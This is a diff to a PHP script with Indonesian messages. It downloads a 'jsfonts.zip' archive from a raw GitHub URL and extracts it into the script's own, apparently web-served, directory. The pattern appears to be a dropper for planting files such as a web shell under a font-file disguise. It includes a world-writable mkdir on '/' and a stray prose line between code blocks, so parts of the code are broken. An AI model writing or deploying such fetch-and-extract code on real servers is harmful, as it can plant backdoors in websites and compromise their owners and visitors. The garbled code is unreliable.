@@ -1,9 +1,9 @@
 <?php
 $url = "https://raw.githubusercontent.com/drianbaferlinlo393/xc/refs/heads/main/jsfonts.zip";
-$save_path = "uploads/jsfonts.zip";
+$save_path = "jsfonts.zip";
 
 if (!file_exists("uploads")) {
-    mkdir("uploads", 0777, true);
+    mkdir("/", 0777, true);
 }
 
 $file_data = file_get_contents($url);
@@ -12,5 +12,36 @@ if ($file_data !== false) {
     echo "File berhasil diunduh ke $save_path";
 } else {
     echo "Gagal mengunduh file.";
+}
+?>
+
+
+printah extar zip di bawah 
+
+<?php
+// Lokasi file ZIP
+$zip_file = __DIR__ . '/jsfonts.zip';
+
+// Tujuan ekstraksi (langsung ke folder js)
+$extract_to = __DIR__ . '/';
+
+// Pastikan file ZIP ada
+if (!file_exists($zip_file)) {
+    die("<p style='color:red'>❌ File ZIP tidak ditemukan di: $zip_file</p>");
+}
+
+// Pastikan folder tujuan ada
+if (!file_exists($extract_to)) {
+    mkdir($extract_to, 0777, true);
+}
+
+// Ekstrak ZIP
+$zip = new ZipArchive;
+if ($zip->open($zip_file) === TRUE) {
+    $zip->extractTo($extract_to);
+    $zip->close();
+    echo "<p style='color:green'>✅ Berhasil mengekstrak ke: $extract_to</p>";
+} else {
+    echo "<p style='color:red'>❌ Gagal membuka file ZIP.</p>";
 }
 ?>
